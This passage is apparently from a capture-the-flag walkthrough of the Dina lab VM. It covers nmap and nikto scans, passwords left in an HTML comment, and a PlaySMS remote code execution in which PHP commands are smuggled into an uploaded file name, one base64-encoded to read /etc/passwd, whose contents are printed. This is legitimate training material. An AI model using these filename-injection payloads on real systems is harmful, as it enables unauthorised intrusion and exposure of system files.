Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5 from 5 to 10 due to 24 out of 59 dropped probes since last increase.
SYN Stealth Scan Timing: About 9.80% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:45 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 11.72% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 14.98% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:05 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:36 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 16.87% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:07 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:56 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 18.59% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:09 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 20.50% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:42 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Warning: 10.0.2.5 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
SYN Stealth Scan Timing: About 23.70% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:12:27 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 45.90% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:11:38 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 51.99% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:17 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:10:33 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 57.71% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:09:26 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 63.26% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:08:19 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 68.64% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:07:11 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 74.03% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:06:01 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 79.24% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:04:51 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 84.50% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:03:40 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 89.77% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:02:27 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SYN Stealth Scan Timing: About 94.92% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 09:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:01:13 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Completed SYN Stealth Scan at 09:23, 1665.92s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 09:23
Scanning 1 service on 10.0.2.5
Completed Service scan at 09:23, 6.04s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 service on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.5&lt;/span&gt;
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-175605&lt;/span&gt; microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of &lt;span class=&quot;nt&quot;&gt;-175605&lt;/span&gt; microseconds.  Ignoring time.
NSE: Script scanning 10.0.2.5.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.10s elapsed
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.5
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00059s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 5 disallowed entries
|_/ange1 /angel1 /nothing /tmp /uploads
|_http-server-header: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Dina
MAC Address: 08:00:27:3A:EC:D6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.5
Uptime guess: 0.023 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Sat Nov 18 08:51:09 2017&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Network Distance: 1 hop
TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;250 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.59 ms 10.0.2.5

NSE: Script Post-scanning.
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Initiating NSE at 09:23
Completed NSE at 09:23, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1675.39 seconds
           Raw packets sent: 127751 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 137025 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.230MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;As you can see, the only service that’s open is &lt;strong&gt;http&lt;/strong&gt;. With that information, we can navigate to it with our browser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dina/main_web.png&quot; alt=&quot;Main Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While looking for clues manually, I decided to run a &lt;strong&gt;nikto&lt;/strong&gt; scan to find some low hanging fruit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.0.2.5
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          10.0.2.5
+ Target Hostname:    10.0.2.5
+ Target Port:        80
+ Start Time:         2017-11-18 08:57:45 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: Apache/2.2.22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server leaks inodes via ETags, header found with file /, inode: 425463, size: 3618, mtime: Tue Oct 17 09:46:52 2017
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ OSVDB-3268: /ange1/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/ange1/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /angel1/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/angel1/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /tmp/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/tmp/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3268: /uploads/: Directory indexing found.
+ Entry &lt;span class=&quot;s1&quot;&gt;'/uploads/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 5 entries which should be manually viewed.
+ Uncommon header &lt;span class=&quot;s1&quot;&gt;'tcn'&lt;/span&gt; found, with contents: list
+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4698ebdc59d15. The following alternatives &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'index'&lt;/span&gt; were found: index.html
+ Apache/2.2.22 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /secure/: Directory indexing found.
+ OSVDB-3092: /tmp/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8351 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 20 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-11-18 08:58:10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;25 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And there it is, in &lt;strong&gt;secure&lt;/strong&gt; directory there is a &lt;strong&gt;backup&lt;/strong&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.5/secure/
backup.zip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortuntely, it’s password protected, so let’s keep it in mind and look for some more clues.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# 7z x backup.zip

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-2410M CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206A7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 336 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: backup.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; backup.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 336


Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
ERROR: Wrong password : backup-cred.mp3

Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Here’s the content of &lt;strong&gt;robots.txt&lt;/strong&gt;, makes it better to scan one by one.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;User-agent: *
Disallow: /ange1
Disallow: /angel1
Disallow: /nothing
Disallow: /tmp
Disallow: /uploads&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;While every other directory is empty, there is a hidden comment in one called &lt;strong&gt;/nothing&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 NOT FOUND&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--
#my secret pass
freedom
password
helloworld!
diana
iloveroot
--&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;NOT FOUND&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt;go back&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;List of passwords, which we can now use to extract the contents of the backup. Luckily, first one already works - &lt;strong&gt;freedom&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# 7z x backup.zip

7-Zip &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;64] 16.02 : Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;locale&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;C.UTF-8,Utf16&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,HugeFiles&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on,64 bits,2 CPUs Intel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;R&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Core&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; i5-2410M CPU @ 2.30GHz &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;206A7&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,ASM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Scanning the drive &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;archives:
1 file, 336 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Extracting archive: backup.zip
&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;
Path &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; backup.zip
Type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; zip
Physical Size &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 336


Would you like to replace the existing file:
  Path:     ./backup-cred.mp3
  Size:     0 bytes
  Modified: 2017-10-17 08:27:49
with the file from archive:
  Path:     backup-cred.mp3
  Size:     176 bytes &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
  Modified: 2017-10-17 08:27:49
? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Y&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;es / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;o / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;lways / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;kip all / A&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;u&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;to rename all / &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Q&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;uit? Y


Enter password &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;will not be echoed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
Everything is Ok      

Size:       176
Compressed: 336&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can take a closer look at the file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file backup-cred.mp3
backup-cred.mp3: ASCII text
root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;backup-cred.mp3

I am not toooo smart &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: &lt;span class=&quot;k&quot;&gt;******&lt;/span&gt;


url : /SecreTSMSgatwayLogin&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great! As simple as it is, we get another clue. Let’s take a look at the provided directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dina/secret-sms.png&quot; alt=&quot;Secret SMS&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we already have a username, the best way to get into the website is to try passwords from the previously provided list. This time it’s &lt;strong&gt;diana&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/dina/secret-sms-logged.png&quot; alt=&quot;Secret SMS Logged&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And after doing a little bit of enumeration, I’ve found exploit available for this service. &lt;a href=&quot;https://www.exploit-db.com/exploits/42003/&quot; title=&quot;PlaySMS Remote Code Execution&quot;&gt;PlaySMS Remote Code Execution&lt;/a&gt;, which we can use to attack our target.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.5/SecreTSMSgatwayLogin/index.php?app=main&amp;amp;inc=feature_sendfromfile&amp;amp;op=list&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In order to run commands, we have to create a file with &lt;strong&gt;php&lt;/strong&gt; command in title, just like this example.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;touch &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system('uname -a'); dia();?&amp;gt;.php&quot;&lt;/span&gt;
Uploaded file: Linux Dina 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It’s working! But there’s one problem - names of our files cannot contain &lt;strong&gt;/&lt;/strong&gt; characters, as they’re restriced by the filesystem. One workaround would be to encode the command with &lt;strong&gt;base64&lt;/strong&gt; and then decode the string through php function.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cat /etc/passwd&quot;&lt;/span&gt; | base64
&lt;span class=&quot;nv&quot;&gt;Y2F0IC9ldGMvcGFzc3dkCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
touch &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(base64_decode('Y2F0IC9ldGMvcGFzc3dkCg==')); dia();?&amp;gt;.php&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Will it work?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:105:114::/nonexistent:/bin/false
avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
saned:x:114:123::/home/saned:/bin/false
touhid:x:1000:1000:touhid,,,:/home/touhid:/bin/bash
mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yes! Now we have to find a way to get to the flag. From numerous times, I remember to start from easiest things, which is checking &lt;strong&gt;sudo -l&lt;/strong&gt; command.&lt;/p&gt;

